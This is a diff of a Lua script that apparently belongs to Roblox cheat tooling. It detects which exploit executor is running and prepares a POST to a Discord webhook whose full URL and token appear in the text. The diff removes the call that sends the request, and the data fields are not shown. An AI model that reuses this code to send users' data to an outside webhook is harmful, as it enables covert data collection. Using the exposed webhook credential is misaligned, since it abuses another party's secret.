@@ -1,8 +1,10 @@
-local exec = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
    secure_load and "Sentinel" or
    KRNL_LOADED and "Krnl" or
    SONA_LOADED and "Sona" or
    "Kid with shit exploit"
+
 local url =
    "https://discord.com/api/webhooks/1086275126481403985/u_Mw3Mqh5cqkrEzwt7_7GbtcN6iUd1nYgwx2sV2BTrFF5EEnk5I1lTYeEJEttlQ92Wfz"
 local data = {
@@ -26,6 +28,3 @@ local headers = {
 }
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
-  
-  
